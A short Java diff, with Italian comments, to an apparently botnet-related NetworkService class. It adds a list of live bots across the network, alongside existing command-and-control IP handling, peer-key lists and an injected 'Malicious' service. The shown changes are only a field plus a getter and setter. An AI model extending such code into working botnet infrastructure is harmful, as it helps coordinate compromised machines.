@@ -47,7 +47,11 @@ public class NetworkService {
 
 //	 Ip dei command e conquer
 	
+	//Lista vicini del rispettivo bot
 	private SyncIpList<IP,PublicKey> neighbours=new SyncIpList<IP,PublicKey>();
+	
+	//Lista dei bot vivi in tutta la rete
+	private SyncIpList<IP,String> aliveBot=new SyncIpList<IP,String>();
 
 	@Autowired
 	private Malicious malServ;
@@ -550,6 +554,23 @@ public class NetworkService {
 		this.elegible = elegible;
 	}
 
+
+	public SyncIpList<IP, String> getAliveBot() {
+		return aliveBot;
+	}
+
+
+	public void setAliveBot(SyncIpList<IP, String> aliveBot) {
+		this.aliveBot = aliveBot;
+	}
+
+
+
+
+
+
+
+	
 	// public SyncCeCList getBotIps() {
 	// return botIps;
 	// }
